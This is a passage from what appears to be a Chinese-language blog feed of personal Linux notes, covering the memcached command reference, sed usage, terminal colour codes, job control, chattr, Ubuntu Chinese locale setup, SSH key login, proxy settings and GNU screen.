64m -vv</code></pre><p>（2）作为后台服务程序运行</p><pre><code>/usr/local/memcached/bin/memcached -p 11211 -m 64m -d#或者/usr/local/memcached/bin/memcached -d -m 64M -u root -l 192.168.0.200 -p 11211 -c 256 -P /tmp/memcached.pid</code></pre><p>windows</p><p>参考： <a href="https://www.runoob.com/memcached/window-install-memcached.html" target="_blank" rel="noopener">https://www.runoob.com/memcached/window-install-memcached.html</a></p><h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><pre><code># 命令中的 HOST 和 PORT 为运行 Memcached 服务的 IP 和 端口telnet HOST PORT# 例子set foo 0 0 3 barget barquit</code></pre><h1 id="Memcached-存储命令"><a href="#Memcached-存储命令" class="headerlink" title="Memcached 存储命令"></a>Memcached 存储命令</h1><h6 id="Memcached-set-命令"><a href="#Memcached-set-命令" class="headerlink" title="Memcached set 命令"></a>Memcached set 命令</h6><blockquote><p>Memcached set 命令用于将 value(数据值) 存储在指定的 key(键) 中。</p></blockquote><blockquote><p>如果set的key已经存在，该命令可以更新该key所对应的原来的数据，也就是实现更新的作用。</p></blockquote><p>语法：</p><blockquote><p>set 命令的基本语法格式如下：</p></blockquote><pre><code>set key flags exptime bytes [noreply] value 参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。flags：可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息 。exptime：在缓存中保存键值对的时间长度（以秒为单位，0 表示永远）bytes：在缓存中存储的字节数noreply（可选）： 该参数告知服务器不需要返回数据value：存储的值（始终位于第二行）（可直接理解为key-value结构中的value）</code></pre><p>实例</p><blockquote><p>以下实例中我们设置：</p></blockquote><ul><li>key → runoob</li><li>flag → 0</li><li>exptime → 900 (以秒为单位)</li><li>bytes → 9 (数据存储的字节数)</li><li>value → memcached</li></ul><pre><code>set runoob 0 900 9memcachedSTOREDget runoobVALUE runoob 0 9memcachedEND输出如果数据设置成功，则输出：STORED输出信息说明：STORED：保存成功后输出。ERROR：在保存失败后输出。</code></pre><h6 id="Memcached-add-命令"><a href="#Memcached-add-命令" class="headerlink" title="Memcached add 命令"></a>Memcached add 命令</h6><blockquote><p>Memcached add 命令用于将 value(数据值) 存储在指定的 key(键) 中。</p></blockquote><blockquote><p>如果 add 的 key 已经存在，则不会更新数据(过期的 key 会更新)，之前的值将仍然保持相同，并且您将获得响应 NOT_STORED。</p></blockquote><p>语法：</p><blockquote><p>add 命令的基本语法格式如下：</p></blockquote><pre><code>add key flags exptime bytes [noreply]value参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。flags：可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息 。exptime：在缓存中保存键值对的时间长度（以秒为单位，0 表示永远）bytes：在缓存中存储的字节数noreply（可选）： 该参数告知服务器不需要返回数据value：存储的值（始终位于第二行）（可直接理解为key-value结构中的value）输出信息说明：STORED：保存成功后输出。NOT_STORED ：在保存失败后输出。</code></pre><h6 id="Memcached-replace-命令"><a href="#Memcached-replace-命令" class="headerlink" title="Memcached replace 命令"></a>Memcached replace 命令</h6><blockquote><p>Memcached replace 命令用于替换已存在的 key(键) 的 value(数据值)。</p></blockquote><blockquote><p>如果 key 不存在，则替换失败，并且您将获得响应 NOT_STORED。</p></blockquote><p>语法：</p><blockquote><p>replace 命令的基本语法格式如下：</p></blockquote><pre><code>replace key flags exptime bytes [noreply]value参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。flags：可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息 。exptime：在缓存中保存键值对的时间长度（以秒为单位，0 表示永远）bytes：在缓存中存储的字节数noreply（可选）： 该参数告知服务器不需要返回数据value：存储的值（始终位于第二行）（可直接理解为key-value结构中的value）输出信息说明：STORED：保存成功后输出。NOT_STORED：执行替换失败后输出。</code></pre><h6 id="Memcached-append-命令"><a href="#Memcached-append-命令" class="headerlink" title="Memcached append 命令"></a>Memcached append 命令</h6><blockquote><p>Memcached append 命令用于向已存在 key(键) 的 value(数据值) 后面追加数据 。</p></blockquote><p>语法：</p><blockquote><p>append 命令的基本语法格式如下：</p></blockquote><pre><code>append key flags exptime bytes [noreply]value参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。flags：可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息 。exptime：在缓存中保存键值对的时间长度（以秒为单位，0 表示永远）bytes：在缓存中存储的字节数noreply（可选）： 该参数告知服务器不需要返回数据value：存储的值（始终位于第二行）（可直接理解为key-value结构中的value）输出信息说明：STORED：保存成功后输出。NOT_STORED：该键在 Memcached 上不存在。CLIENT_ERROR：执行错误。</code></pre><h6 id="Memcached-prepend-命令"><a href="#Memcached-prepend-命令" class="headerlink" title="Memcached prepend 命令"></a>Memcached prepend 命令</h6><blockquote><p>Memcached prepend 命令用于向已存在 key(键) 的 value(数据值) 前面追加数据 。</p></blockquote><p>语法：</p><blockquote><p>prepend 命令的基本语法格式如下：</p></blockquote><pre><code>prepend key flags exptime bytes [noreply]value参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。flags：可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息 。exptime：在缓存中保存键值对的时间长度（以秒为单位，0 表示永远）bytes：在缓存中存储的字节数noreply（可选）： 该参数告知服务器不需要返回数据value：存储的值（始终位于第二行）（可直接理解为key-value结构中的value）输出信息说明：STORED：保存成功后输出。NOT_STORED：该键在 Memcached 上不存在。CLIENT_ERROR：执行错误。</code></pre><h6 id="Memcached-CAS-命令"><a href="#Memcached-CAS-命令" class="headerlink" title="Memcached CAS 命令"></a>Memcached CAS 命令</h6><blockquote></blockquote><p>Memcached CAS（Check-And-Set 或 Compare-And-Swap） 命令用于执行一个”检查并设置”的操作</p><blockquote><p>它仅在当前客户端最后一次取值后，该key 对应的值没有被其他客户端修改的情况下， 才能够将值写入。</p></blockquote><blockquote><p>检查是通过cas_token参数进行的， 这个参数是Memcach指定给已经存在的元素的一个唯一的64位值。</p></blockquote><p>语法：</p><blockquote><p>CAS 命令的基本语法格式如下：</p></blockquote><pre><code>cas key flags exptime bytes unique_cas_token [noreply]value参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。flags：可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息 。exptime：在缓存中保存键值对的时间长度（以秒为单位，0 表示永远）bytes：在缓存中存储的字节数unique_cas_token通过 gets 命令获取的一个唯一的64位值。noreply（可选）： 该参数告知服务器不需要返回数据value：存储的值（始终位于第二行）（可直接理解为key-value结构中的value）</code></pre><p>实例</p><blockquote><p>要在 Memcached 上使用 CAS 命令，你需要从 Memcached 服务商通过 gets 命令获取令牌（token）。</p></blockquote><blockquote><p>gets 命令的功能类似于基本的 get 命令。两个命令之间的差异在于，gets 返回的信息稍微多一些：64 位的整型值非常像名称/值对的 “版本” 标识符。</p></blockquote><p>实例步骤如下：</p><ul><li>如果没有设置唯一令牌，则 CAS 命令执行错误。</li><li>如果键 key 不存在，执行失败。</li><li>添加键值对。</li><li>通过 gets 命令获取唯一令牌。</li><li>使用 cas 命令更新数据</li><li>使用 get 命令查看数据是否更新</li></ul><pre><code>cas tp 0 900 9ERROR             &lt;− 缺少 tokencas tp 0 900 9 2memcachedNOT_FOUND         &lt;− 键 tp 不存在set tp 0 900 9memcachedSTOREDgets tpVALUE tp 0 9 1memcachedENDcas tp 0 900 5 1redisSTOREDget tpVALUE tp 0 5redisEND输出如果数据添加成功，则输出：STORED输出信息说明：STORED：保存成功后输出。ERROR：保存出错或语法错误。EXISTS：在最后一次取值后另外一个用户也在更新该数据。NOT_FOUND：Memcached 服务上不存在该键值。</code></pre><h1 id="Memcached-查找命令"><a href="#Memcached-查找命令" class="headerlink" title="Memcached 查找命令"></a>Memcached 查找命令</h1><h6 id="Memcached-get-命令"><a href="#Memcached-get-命令" class="headerlink" title="Memcached get 命令"></a>Memcached get 命令</h6><blockquote><p>Memcached get 命令获取存储在 key(键) 中的 value(数据值) ，如果 key 不存在，则返回空。</p></blockquote><p>语法：</p><pre><code>get 命令的基本语法格式如下：get key多个 key 使用空格隔开，如下:get key1 key2 key3参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。</code></pre><h6 id="Memcached-gets-命令"><a href="#Memcached-gets-命令" class="headerlink" title="Memcached gets 命令"></a>Memcached gets 命令</h6><blockquote><p>Memcached gets 命令获取带有 CAS 令牌存 的 value(数据值) ，如果 key 不存在，则返回空。</p></blockquote><p>语法：</p><pre><code>gets 命令的基本语法格式如下：gets key多个 key 使用空格隔开，如下:gets key1 key2 key3参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。</code></pre><h6 id="Memcached-delete-命令"><a href="#Memcached-delete-命令" class="headerlink" title="Memcached delete 命令"></a>Memcached delete 命令</h6><blockquote><p>Memcached delete 命令用于删除已存在的 key(键)。</p></blockquote><p>语法：</p><pre><code>delete 命令的基本语法格式如下：delete key [noreply]参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。noreply（可选）： 该参数告知服务器不需要返回数据输出信息说明：DELETED：删除成功。ERROR：语法错误或删除失败。NOT_FOUND：key 不存在。</code></pre><h6 id="Memcached-incr-与-decr-命令"><a href="#Memcached-incr-与-decr-命令" class="headerlink" title="Memcached incr 与 decr 命令"></a>Memcached incr 与 decr 命令</h6><blockquote><p>Memcached incr 与 decr 命令用于对已存在的 key(键) 的数字值进行自增或自减操作。</p></blockquote><blockquote><p>incr 与 decr 命令操作的数据必须是十进制的32位无符号整数。</p></blockquote><blockquote><p>如果 key 不存在返回 NOT_FOUND，如果键的值不为数字，则返回 CLIENT_ERROR，其他错误返回 ERROR。</p></blockquote><pre><code>incr 命令语法：incr 命令的基本语法格式如下：incr key increment_value参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。increment_value： 增加的数值。输出信息说明：NOT_FOUND：key 不存在。CLIENT_ERROR：自增值不是对象。ERROR其他错误，如语法错误等。</code></pre><pre><code>decr 命令decr 命令的基本语法格式如下：decr key decrement_value参数说明如下：key：键值 key-value 结构中的 key，用于查找缓存值。decrement_value： 减少的数值。输出信息说明：NOT_FOUND：key 不存在。CLIENT_ERROR：自增值不是对象。ERROR其他错误，如语法错误等。</code></pre><h1 id="Memcached-统计命令"><a href="#Memcached-统计命令" class="headerlink" title="Memcached 统计命令"></a>Memcached 统计命令</h1><h6 id="Memcached-stats-命令"><a href="#Memcached-stats-命令" class="headerlink" title="Memcached stats 命令"></a>Memcached stats 命令</h6><blockquote><p>Memcached stats 命令用于返回统计信息例如 PID(进程号)、版本号、连接数等。</p></blockquote><p>语法：</p><blockquote><p>stats 命令的基本语法格式如下：</p></blockquote><pre><code>stats</code></pre><p>这里显示了很多状态信息，下边详细解释每个状态项：</p><ul><li>pid：    memcache服务器进程ID</li><li>uptime：服务器已运行秒数</li><li>time：服务器当前Unix时间戳</li><li>version：memcache版本</li><li>pointer_size：操作系统指针大小</li><li>rusage_user：进程累计用户时间</li><li>rusage_system：进程累计系统时间</li><li>curr_connections：当前连接数量</li><li>total_connections：Memcached运行以来连接总数</li><li>connection_structures：Memcached分配的连接结构数量</li><li>cmd_get：get命令请求次数</li><li>cmd_set：set命令请求次数</li><li>cmd_flush：flush命令请求次数</li><li>get_hits：get命令命中次数</li><li>get_misses：get命令未命中次数</li><li>delete_misses：delete命令未命中次数</li><li>delete_hits：delete命令命中次数</li><li>incr_misses：incr命令未命中次数</li><li>incr_hits：incr命令命中次数</li><li>decr_misses：decr命令未命中次数</li><li>decr_hits：decr命令命中次数</li><li>cas_misses：cas命令未命中次数</li><li>cas_hits：cas命令命中次数</li><li>cas_badval：使用擦拭次数</li><li>auth_cmds：认证命令处理的次数</li><li>auth_errors：认证失败数目</li><li>bytes_read：读取总字节数</li><li>bytes_written：发送总字节数</li><li>limit_maxbytes：分配的内存总大小（字节）</li><li>accepting_conns：服务器是否达到过最大连接（0/1）</li><li>listen_disabled_num：失效的监听数</li><li>threads：当前线程数</li><li>conn_yields：连接操作主动放弃数目</li><li>bytes：当前存储占用的字节数</li><li>curr_items：当前存储的数据总数</li><li>total_items：启动以来存储的数据总数</li><li>evictions：LRU释放的对象数目</li><li>reclaimed：已过期的数据条目来存储新数据的数目</li></ul><h6 id="Memcached-stats-items-命令"><a href="#Memcached-stats-items-命令" class="headerlink" title="Memcached stats items 命令"></a>Memcached stats items 命令</h6><blockquote><p>Memcached stats items 命令用于显示各个 slab 中 item 的数目和存储时长(最后一次访问距离现在的秒数)。</p></blockquote><p>语法：</p><blockquote><p>stats items 命令的基本语法格式如下：</p></blockquote><pre><code>stats items</code></pre><h6 id="Memcached-stats-slabs-命令"><a href="#Memcached-stats-slabs-命令" class="headerlink" title="Memcached stats slabs 命令"></a>Memcached stats slabs 命令</h6><blockquote><p>Memcached stats slabs 命令用于显示各个slab的信息，包括chunk的大小、数目、使用情况等。</p></blockquote><p>语法：</p><blockquote><p>stats slabs 命令的基本语法格式如下：</p></blockquote><pre><code>stats slabs</code></pre><h6 id="Memcached-stats-sizes-命令"><a href="#Memcached-stats-sizes-命令" class="headerlink" title="Memcached stats sizes 命令"></a>Memcached stats sizes 命令</h6><blockquote><p>Memcached stats sizes 命令用于显示所有item的大小和个数。</p></blockquote><blockquote><p>该信息返回两列，第一列是 item 的大小，第二列是 item 的个数。</p></blockquote><p>语法：</p><blockquote><p>stats sizes 命令的基本语法格式如下：</p></blockquote><pre><code>stats sizes</code></pre><h6 id="Memcached-flush-all-命令"><a href="#Memcached-flush-all-命令" class="headerlink" title="Memcached flush_all 命令"></a>Memcached flush_all 命令</h6><blockquote><p>Memcached flush_all 命令用于清理缓存中的所有 key=&gt;value(键=&gt;值) 对。</p></blockquote><blockquote><p>该命令提供了一个可选参数 time，用于在制定的时间后执行清理缓存操作。</p></blockquote><p>语法：</p><blockquote><p>flush_all 命令的基本语法格式如下：</p></blockquote><pre><code>flush_all [time] [noreply]</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux sed.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20sed/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20sed/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Linux sed 命令是利用脚本来处理文本文件。<br>sed 可依照脚本的指令来处理、编辑文本文件。<br>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等</p></blockquote><p>语法:<br>sed [-hnV][-e<script>][-f<script文件>][文本文件]</p><blockquote><p>gsed -n '/a/p' a</p></blockquote><p>参数说明:</p><ul><li>-e<script>或--expression=<script> 以选项中指定的script来处理输入的文本文件。<br>（-e : 可以在同一行里执行多条命令,不加的话写了多个只执行第一个）</li><li>-f<script文件>或--file=<script文件> 以选项中指定的script文件来处理输入的文本文件。</li><li>-h或--help 显示帮助。</li><li>-n或--quiet或--silent 仅显示script处理后的结果。</li><li>-V或--version 显示版本信息。</li></ul><p>动作说明:</p><ul><li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)</li><li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行</li><li>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</li><li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li><li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li><li>s ：取代，可以直接进行取代的工作,通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g</li></ul><pre><code>删除行# 将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除nl /etc/passwd | sed &#39;2,5d&#39;#只要删除第 2 行nl /etc/passwd | sed &#39;2d&#39;#要删除第 3 到最后一行nl /etc/passwd | sed &#39;3,$d&#39;添加行#在第二行后(亦即是加在第三行)加上『drink tea?』字样nl /etc/passwd | sed &#39;2a drink tea&#39;#那如果是要在第二行前nl /etc/passwd | sed &#39;2i drink tea&#39; #增加两行以上，每一行之间都必须要以反斜杠&#39;\&#39;来进行新行的添加nl /etc/passwd | sed &#39;2a Drink tea or ......\&gt; drink beer ?&#39;替换与显示(以行为单位)#将第2-5行的内容取代成为『No 2-5 number』nl /etc/passwd | sed &#39;2,5c No 2-5 number&#39;#仅列出 /etc/passwd 文件内的第 5-7 行nl /etc/passwd | sed -n &#39;5,7p&#39;数据的搜索并显示#搜索 /etc/passwd有root关键字的行nl /etc/passwd | sed &#39;/root/p&#39;#如果root找到，除了输出所有行，还会输出匹配行#使用-n的时候将只打印包含模板的行nl /etc/passwd | sed -n &#39;/root/p&#39;数据的搜寻并删除#删除/etc/passwd所有包含root的行，其他行输出nl /etc/passwd | sed  &#39;/root/d&#39;数据的搜寻并执行命令#搜索/etc/passwd,找到root对应的行，#执行后面花括号中的一组命令，每个命令之间用分号分隔，#这里把bash替换为blueshell，再输出这行,s替换;结尾，最后的q是退出nl /etc/passwd | sed -n &#39;/root/{s/bash/blueshell/;p;q;}&#39;# 加上 g 表示全部完全匹配# sed &#39;s/要被取代的字串/新的字串/g&#39;/sbin/ifconfig eth0 | grep &#39;inet addr&#39; | sed &#39;s/^.*addr://g&#39; | sed &#39;s/Bcast.*$//g&#39;多点编辑,-e表示多点编辑# 一条sed命令，删除/etc/passwd第三行到末尾的数据，并把bash替换为blueshellnl /etc/passwd | sed -e &#39;3,$d&#39; -e &#39;s/bash/blueshell/&#39;直接修改文件内容，-i 选项sed -i &#39;$a # This is a test&#39; regular_express.txt</code></pre><blockquote><p>报错：command a expects \ followed by text</p></blockquote><pre><code>参数“i”的用途是直接在文件中进行替换。为防止误操作带来灾难性的后果，sed在替换前可以自动对文件进行备份，前提是需要提供一个后缀名。从上面对参数“i”的详细说明中可以看到，mac osx下是强制要求备份的（当然也可以使用空字符串来取消备份），但centos下是可选的。如果不需要备份文件，mac osx下可以使用如下命令完成替换操作：sed -i &#39;&#39; &#39;s/oldstring/newstring/g&#39; full-path-file</code></pre><blockquote><p>报错：command a expects \ followed by text</p></blockquote><pre><code>原因: macos 用sed命令做插入等命令会爆这个错，主要是因为mac的sed命令有点老解决方法1：在你敲完sed -n &#39;5a  之后 敲一个反斜杠 换行然后输入其余的命令解决方法2(推荐)：brew install gnu-sed   用gnu的sed（centos版本的sed）安装下来后为指令为 gsed</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux 终端输出带颜色的字符.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20%E7%BB%88%E7%AB%AF%E8%BE%93%E5%87%BA%E5%B8%A6%E9%A2%9C%E8%89%B2%E7%9A%84%E5%AD%97%E7%AC%A6/"/>
      <url>/2019/12/03/deploy/linux/linux%20%E7%BB%88%E7%AB%AF%E8%BE%93%E5%87%BA%E5%B8%A6%E9%A2%9C%E8%89%B2%E7%9A%84%E5%AD%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>示例</p><pre><code>echo -e &quot;\033[47;30;5m david use echo say \033[0m Hello World \n&quot; # -e，可以解释转义字符echo -e &quot;\033[20;1H\033[1;4;32m david use echo say \033[0m Hello World \n&quot;# 这行命令首先\033[20;1H将光标移动到终端第20行第1列，# 之后的\033[1;4;32m将文本属性设置为高亮、带下划线且颜色为绿色，# 然后输出Hello,world；# 最后\033[0m将终端属性设为缺省</code></pre><pre><code>0 : 重新设置属性到缺省设置1 : 设置粗体2 : 设置一半亮度(模拟彩色显示器的颜色)4 : 设置下划线(模拟彩色显示器的颜色)5 : 闪烁（慢）6 : 闪烁（快）（※）7 : 设置反向图象8 : 消隐 22 : 设置一般密度24 : 关闭下划线25 : 关闭闪烁27 : 关闭反向图象// 字体颜范围(前景颜色):30~3930 : 黑 31 : 红 32 : 绿 33 : 黄 34 : 蓝色 35 : 紫色 36 : 深绿 37 : 白色 38:在缺省的前景颜色上设置下划线39:在缺省的前景颜色上关闭下划线// 字背景颜色范围(背景颜色):40~49 40 : 黑 41 : 深红 42 : 绿 43 : 黄色 44 : 蓝色 45 : 紫色 46 : 深绿 47 : 白色 nA : 光标上移n行 nB : 光标下移n行 nC : 光标右移n行 nD : 光标左移n行 y;xH : 设置光标位置 2J : 清屏 K : 清除从光标到行尾的内容 s : 保存光标位置 u : 恢复光标位置 ?25l :     隐藏光标 ?25h :     显示光标</code></pre><blockquote><p>预先定义颜色变量</p></blockquote><pre><code>RED_COLOR=&#39;\E[1;31m&#39;  YELOW_COLOR=&#39;\E[1;33m&#39; BLUE_COLOR=&#39;\E[1;34m&#39;  RESET=&#39;\E[0m&#39;#需要使用echo -eecho -e  &quot;${RED_COLOR}===david say red color===${RESET}&quot;echo -e  &quot;${YELOW_COLOR}===david say yelow color===${RESET}&quot;echo -e  &quot;${BLUE_COLOR}===david say green color===${RESET}&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux jobs.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20jobs/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20jobs/</url>
      
        <content type="html"><![CDATA[<ol><li><p>将“当前”作业放到后台“暂停”： ctrl + z</p></li><li><p>观察当前后台作业状态： jobs  </p><blockquote><p>-l 除了列出作业号之外同时列出PID<br>-r：列出仅在后台运行（run）的作业<br>-s：仅列出暂停的作业</p></blockquote></li><li><p>将后台作业拿到前台处理：fg</p><blockquote><p>fg %jobnumber</p></blockquote></li><li><p>让作业在后台运行：bg</p><blockquote><p>ctrl+z让当前作业到后台去暂停，bg 作业号就可以在后台run</p></blockquote></li><li><p>管理后台作业：kill</p><blockquote><p>我们可以让一个已经在后台的作业继续执行，也可以让该作业使用fg拿到前台。如果直接删除该作业，或者让作业重启，需要给作业发送信号。</p></blockquote><blockquote><p>kill -signal %jobnumber<br>参数：<br>-l 列出当前kill能够使用的信号。 signal：表示给后台的作业什么指示，用man 7 signal可知<br>-1（数字）：重新读取一次参数的设置文件（类似reload）<br>-2：表示与由键盘输入ctrl-c同样的动作<br>-9：立刻强制删除一个作业<br>-15：以正常方式终止一项作业。与-9不一样。</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux lsattr.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20lsattr/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20lsattr/</url>
      
        <content type="html"><![CDATA[<pre><code>lsattr a.shchattr +i a.sh # 加了之后无法删除chattr -i a.sh # 去除之后才可以删除</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux aliyun_ubuntu设置中文.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20aliyun_ubuntu%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87/"/>
      <url>/2019/12/03/deploy/linux/linux%20aliyun_ubuntu%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/zhangchao19890805/article/details/52743380" target="_blank" rel="noopener">https://blog.csdn.net/zhangchao19890805/article/details/52743380</a></p><p>1.安装之前检测当前语言环境</p><pre><code>echo $LANG# 屏幕显示：en_US.UTF-8# 说明现在是英语环境，需要切换到中文环境。</code></pre><p>2、安装中文语言包</p><pre><code>apt-get update &amp;&amp; apt-get install language-pack-zh-hans -y</code></pre><p>3、vim /etc/default/locale</p><blockquote><p>把原来英语 US 的都换成如下的内容，并且注意配置文件中不能有多余的空格</p></blockquote><pre><code>LANG=&quot;zh_CN.UTF-8&quot;LANGUAGE=&quot;zh_CN:zh&quot;LC_NUMERIC=&quot;zh_CN&quot;LC_TIME=&quot;zh_CN&quot;LC_MONETARY=&quot;zh_CN&quot;LC_PAPER=&quot;zh_CN&quot;LC_NAME=&quot;zh_CN&quot;LC_ADDRESS=&quot;zh_CN&quot;LC_TELEPHONE=&quot;zh_CN&quot;LC_MEASUREMENT=&quot;zh_CN&quot;LC_IDENTIFICATION=&quot;zh_CN&quot;LC_ALL=&quot;zh_CN.UTF-8&quot;</code></pre><p>4、vim /etc/environment</p><blockquote><p>原来有一行 PATH=.. 不要动这一行<br>另起一行，复制粘贴以下内容，并且注意配置文件中不能有多余的空格：</p></blockquote><pre><code>LANG=&quot;zh_CN.UTF-8&quot;LANGUAGE=&quot;zh_CN:zh&quot;LC_NUMERIC=&quot;zh_CN&quot;LC_TIME=&quot;zh_CN&quot;LC_MONETARY=&quot;zh_CN&quot;LC_PAPER=&quot;zh_CN&quot;LC_NAME=&quot;zh_CN&quot;LC_ADDRESS=&quot;zh_CN&quot;LC_TELEPHONE=&quot;zh_CN&quot;LC_MEASUREMENT=&quot;zh_CN&quot;LC_IDENTIFICATION=&quot;zh_CN&quot;LC_ALL=&quot;zh_CN.UTF-8&quot;</code></pre><p>5、重启机器</p><pre><code>reboot</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux ssh.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20ssh/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20ssh/</url>
      
        <content type="html"><![CDATA[<blockquote><p>生成</p></blockquote><pre><code>ssh-keygen -t rsa -C &quot;yourmail@gmail.com&quot;# ssh-keygen -f othername # 来生成指定的文件名，或者生成之后# 但是ssh命令默认只会读取 id_rsa这个私钥，所以如果 是其它 的名字需要添加配置文件 ~/.ssh/config也可以两个改名</code></pre><blockquote><p>在服务器上安装公钥</p></blockquote><pre><code>[root@host ~]$ cd .ssh[root@host .ssh]$ cat id_rsa.pub &gt;&gt; authorized_keys</code></pre><blockquote><p>如此便完成了公钥的安装。为了确保连接成功，请保证以下文件权限正确：</p></blockquote><pre><code>[root@host .ssh]$ chmod 600 authorized_keys[root@host .ssh]$ chmod 700 ~/.ssh</code></pre><blockquote><p>设置 SSH，打开密钥登录功能</p></blockquote><pre><code>#编辑 /etc/ssh/sshd_config 文件，进行如下设置：RSAAuthentication yesPubkeyAuthentication yes#另外，请留意 root 用户能否通过 SSH 登录：PermitRootLogin yes#当你完成全部设置，并以密钥方式登录成功后，再禁用密码登录：PasswordAuthentication no#最后，重启 SSH 服务：[root@host .ssh]$ service sshd restart</code></pre><blockquote><p>本地配置</p></blockquote><pre><code># 修改 .ssh/cofnig 文件，添加示例如下Host 别名    hostName 192.168.1.2    Port 22    User root</code></pre><blockquote><p>重置服务器后</p></blockquote><pre><code>ssh-keygen -R 你要访问的IP地址</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux 设置代理.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
      <url>/2019/12/03/deploy/linux/linux%20%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>设置代理</p><pre><code>export http_proxy=http://proxyAddress:portexport https_proxy=http://127.0.0.1:12333export http_proxy=&quot;socks5://127.0.0.1:1080&quot;export https_proxy=&quot;socks5://127.0.0.1:1080&quot;# 或者干脆直接设置ALL_PROXYexport ALL_PROXY=socks5://127.0.0.1:1080# =================改相应工具的配置，比如apt的配置sudo vim /etc/apt/apt.conf在文件末尾加入下面这行Acquire::http::Proxy &quot;http://proxyAddress:port&quot;# ==============# 如果说经常使用git对于其他方面都不是经常使用，可以直接配置git的命令。# 使用ss/ssr来加快git的速度# 直接输入这个命令就好了git config --global http.proxy &#39;socks5://127.0.0.1:1080&#39; git config --global https.proxy &#39;socks5://127.0.0.1:1080&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux screen.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20screen/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20screen/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-screen/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-cn-screen/index.html</a></p><blockquote><p>会话操作</p></blockquote><pre><code>screen  # 创建会话，直接键入screen,启动默认shellscreen -S yourname   # 新建叫yourname的sessionscreen -r yourname   # 恢复离线的screen作业.screen -d yourname   # 离线某个screen作业.screen -d -r test  # 强制将这个会话从它所在的终端分离，转移到新的终端上来screen vi test  # 创建会话，Screen命令后跟你要执行的程序，退出vi时同时退出screen会话screnn -d -m  # 启动一个开始就处于断开模式的会话,可以跟 -S 参数-m  # 即使目前已在作业中的screen作业，仍强制建立新的screen作业。-x  # 恢复之前离线的screen作业screen -d -r yourname #  结束当前session并回到yourname这个sessionscreen -ls    # 查看会话列表screen -r id  # 重新连接kill id  # 直接杀死会话kill -9 id  # 杀死会话，会话状态变deadscreen -wipe  # 清除状态为dead的会话</code></pre><blockquote><p>窗口操作</p></blockquote><pre><code>ctrl+a,c  # 创建一个新的运行shell的窗口并切换到该窗口ctrl+a,d    # 暂时断开当前会话Ctrl+a,?    # 显示所有键绑定信息Ctrl+a,w    # 显示所有窗口列表Ctrl+a,Ctrl-a    # 切换到之前显示的窗口Ctrl+a,n    # 切换到下一个窗口Ctrl+a,p    # 切换到前一个窗口(与C-a n相对)Ctrl+a [Space] #  由视窗0循序切换到视窗9Ctrl+a,0..9    # 切换到窗口0..9Ctrl+a,a    # 发送 C-a到当前窗口Ctrl+a,k    # 杀掉当前窗口Ctrl+a,[    